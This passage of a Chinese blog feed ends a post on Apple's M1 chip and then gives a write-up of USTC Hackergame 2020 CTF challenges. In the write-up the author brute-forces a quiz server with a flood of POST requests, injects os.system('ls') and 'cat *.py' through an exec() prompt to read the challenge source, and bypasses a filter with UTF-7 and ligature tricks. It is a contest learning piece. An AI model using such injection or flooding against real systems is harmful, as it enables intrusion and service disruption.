核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a 